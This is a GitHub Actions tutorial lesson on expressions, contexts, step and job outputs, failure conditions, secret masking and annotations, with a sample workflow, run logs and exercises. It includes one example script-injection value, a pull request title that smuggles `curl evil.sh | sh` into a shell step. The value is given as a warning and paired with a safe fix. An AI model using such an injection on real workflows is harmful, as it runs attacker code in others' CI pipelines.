---
title: 4. Expressions, contexts and outputs
description: ${{ }} expressions and contexts, environment variables, step and job outputs, conditions after a failure, masked secrets and annotations.
sidebar:
  order: 4
---

## Two kinds of substitution

[Lesson 1](../01-first-workflow/) showed that `${{ github.event_name }}` was already replaced in the script the runner executed, while `$RUNNER_OS` was expanded by bash. Keep the two apart:

| | `${{ expression }}` | `$VAR` / `$env:VAR` |
|---|---|---|
| Evaluated by | GitHub, before the step runs | the shell, while the step runs |
| Can read | contexts: `github`, `env`, `vars`, `secrets`, `inputs`, `matrix`, `steps`, `needs`, `job`, `runner` | environment variables |
| Allowed in | almost any value of the YAML, and `if:` | only inside scripts |
| C# analogy | a source generator: the text is produced before compilation | a variable read at run time |

Because `${{ }}` pastes text into the script, **never** put untrusted values in it directly — a pull request title such as `"; curl evil.sh | sh; echo "` would become shell code. Pass them through `env:` and read `$VAR` instead. [Lesson 7](../07-security/) runs it for real.

## The workflow

[`.github/workflows/gha-04-data.yml`](https://github.com/spareilleux/learn/blob/main/.github/workflows/gha-04-data.yml):

```yaml
# GitHub Actions course, lesson 4: expressions, contexts, environment, outputs, conditions
name: "GHA 04: data between steps and jobs"

on:
  workflow_dispatch:
    inputs:
      fail:
        description: Make the test step fail
        type: boolean
        default: false
  push:
    branches: [main]
    paths: ['.github/workflows/gha-04-data.yml']

env:
  COURSE: github-actions

jobs:
  produce:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.version.outputs.value }}
    env:
      LESSON: '04'
    steps:
      - name: Expressions and contexts
        run: |
          echo "course=$COURSE lesson=$LESSON"
          echo "run ${{ github.run_number }}, attempt ${{ github.run_attempt }}"
          echo "is main: ${{ github.ref == 'refs/heads/main' }}"
          echo "upper: ${{ format('{0}-{1}', env.COURSE, env.LESSON) }}"

      - name: Compute a version
        id: version
        run: echo "value=1.0.${{ github.run_number }}" >> "$GITHUB_OUTPUT"

      - name: Export a variable for later steps
        run: echo "BUILD_LABEL=build-${{ steps.version.outputs.value }}" >> "$GITHUB_ENV"

      - name: Read it back
        run: echo "BUILD_LABEL is $BUILD_LABEL"

      - name: A secret is masked in logs
        env:
          TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "token length: ${#TOKEN}"
          echo "token: $TOKEN"

      - name: Tests (fail on demand)
        run: |
          if [ "${{ inputs.fail }}" = "true" ]; then
            echo "::error file=code/github-actions/dotnet/Slugs/Slug.cs,line=9::Pretend a test failed"
            exit 1
          fi
          echo "tests passed"

      - name: Only on failure
        if: failure()
        run: echo "a previous step failed"

      - name: Always
        if: always()
        run: |
          echo "job status: ${{ job.status }}"
          echo "### Version ${{ steps.version.outputs.value }}" >> "$GITHUB_STEP_SUMMARY"

  consume:
    needs: produce
    runs-on: ubuntu-latest
    steps:
      - run: echo "version from produce = ${{ needs.produce.outputs.version }}"
```

## Run 1: everything passes

The first step, as the runner received it and as it printed:

```text
echo "course=$COURSE lesson=$LESSON"
echo "run 1, attempt 1"
echo "is main: true"
echo "upper: github-actions-04"
course=github-actions lesson=04
run 1, attempt 1
is main: true
upper: github-actions-04
```

- `env:` at workflow level (`COURSE`) and at job level (`LESSON`) both became environment variables; the most specific level wins when names collide.
- `github.run_number` counts the runs **of this workflow** (1 here, it's new); `run_attempt` increases when you click *Re-run*.
- `==` returns `true` / `false`; `format()` is one of the built-in functions, with `contains()`, `startsWith()`, `toJSON()`, `hashFiles()`…

### Passing data between steps

Two special files do it:

| Write to | Syntax | Read later as |
|---|---|---|
| `$GITHUB_OUTPUT` | `name=value` | `${{ steps.<id>.outputs.<name> }}` (the step needs an `id`) |
| `$GITHUB_ENV` | `NAME=value` | `$NAME` in the **following** steps (not the current one) |

```text
echo "value=1.0.1" >> "$GITHUB_OUTPUT"
echo "BUILD_LABEL=build-1.0.1" >> "$GITHUB_ENV"
...
  BUILD_LABEL: build-1.0.1
BUILD_LABEL is build-1.0.1
```

From the step after the export on, the log lists `BUILD_LABEL` in the step's `env:` block.

### Passing data between jobs

Jobs run on different machines, so a step output must be **declared** as a job output (`jobs.produce.outputs.version`), and the consumer must declare `needs: produce`:

```text
version from produce = 1.0.1
```

Without `needs`, `consume` would start at the same time as `produce` and `needs.produce` wouldn't exist.

### Secrets are masked

```text
  TOKEN: ***
token length: 377
token: ***
```

The runner replaces every occurrence of a secret's value with `***` in the logs, even when a script prints it. The length still leaks — and masking is based on the exact value: a secret transformed by the script (base64-encoded, split, reversed) isn't recognized. Masking protects against accidents, not against a malicious step.

## Run 2: failing on demand

```powershell
gh workflow run gha-04-data.yml --field fail=true
```

```text
if [ "true" = "true" ]; then
  echo "::error file=code/github-actions/dotnet/Slugs/Slug.cs,line=9::Pretend a test failed"
  exit 1
fi
##[error]Pretend a test failed
##[error]Process completed with exit code 1.
```

What happened to the steps and jobs after it:

```text
produce  failure
  Tests (fail on demand)  failure
  Only on failure         success
  Always                  success
consume  skipped
```

- Every step has an implicit `if: success()`: after a failure, normal steps are skipped. `failure()` runs only if a previous step failed; `always()` runs no matter what — including after a cancellation.
- `job.status` was `failure` in the `Always` step: `echo "job status: failure"`.
- `consume` was **skipped**, not failed: `needs` also implies success. Write `if: always()` on the job (or `if: ${{ !cancelled() }}`) to run it anyway.

### Annotations

`::error file=…,line=…::message` is a **workflow command**: the runner turns it into an annotation attached to that file and line, visible on the run summary and in the pull request's *Files changed* tab. Through the API:

```powershell
gh api repos/spareilleux/learn/check-runs/<job-id>/annotations --jq '.[] | "\(.annotation_level) \(.path):\(.start_line) \(.message)"'
```

```text
failure .github:14 Process completed with exit code 1.
failure code/github-actions/dotnet/Slugs/Slug.cs:9 Pretend a test failed
```

`::warning` and `::notice` work the same way. And `$GITHUB_STEP_SUMMARY` accepts Markdown: the `### Version 1.0.2` line of the `Always` step appears as a heading on the run's summary page.

## Key takeaways

- `${{ }}` is evaluated by GitHub and pasted as text; `$VAR` is read by the shell. Untrusted values go through `env:`.
- `$GITHUB_OUTPUT` → `steps.<id>.outputs`; `$GITHUB_ENV` → variables for the next steps; job `outputs` + `needs` → data between jobs.
- After a failure, only `failure()` and `always()` steps run, and dependent jobs are skipped.
- Secrets are masked by value in logs, which is a safety net, not a security boundary.
- `::error file=,line=::` creates annotations; `$GITHUB_STEP_SUMMARY` writes the run summary.

## Exercises

1. In the `Export a variable for later steps` step, add `echo "now: $BUILD_LABEL"` after the `>> "$GITHUB_ENV"` line. What does it print?

<details>
<summary>Solution</summary>

`now: ` followed by nothing. Checked with [`gha-04-exercises.yml`](https://github.com/spareilleux/learn/blob/main/.github/workflows/gha-04-exercises.yml):

```text
now: 
next: build-1
```

`$GITHUB_ENV` is read by the runner **between** steps: the variable exists from the next step on. Inside the same step, use a normal shell variable.

</details>

2. Make `consume` run even when `produce` fails, but not when the run is cancelled. What will `needs.produce.outputs.version` contain after the failing run?

<details>
<summary>Solution</summary>

```yaml
  consume:
    needs: produce
    if: ${{ !cancelled() }}
```

The version: it was written to `$GITHUB_OUTPUT` before the failing step, and job outputs are evaluated at the end of the job whatever its result. An output of a step that never ran is an empty string. The check workflow declares both, then fails between them:

```text
produce result: failure
version: '1.0.1'
never:   ''
```

</details>

3. A workflow runs on `pull_request` and prints the title with `run: echo "Title: ${{ github.event.pull_request.title }}"`. Rewrite the step safely.

<details>
<summary>Solution</summary>

```yaml
      - name: Show the title
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: echo "Title: $TITLE"
```

The expression is now only used as the value of an environment variable; bash reads `$TITLE` as data and never parses its content as code.

</details>

## Sources

- [Evaluate expressions in workflows and actions](https://docs.github.com/actions/reference/workflows-and-actions/expressions)
- [Contexts reference](https://docs.github.com/actions/reference/workflows-and-actions/contexts)
- [Workflow commands for GitHub Actions](https://docs.github.com/actions/reference/workflows-and-actions/workflow-commands)
- [Passing information between jobs](https://docs.github.com/actions/how-tos/write-workflows/choose-what-workflows-do/pass-job-outputs)
- [Security hardening: understanding the risk of script injections](https://docs.github.com/actions/concepts/security/script-injections)
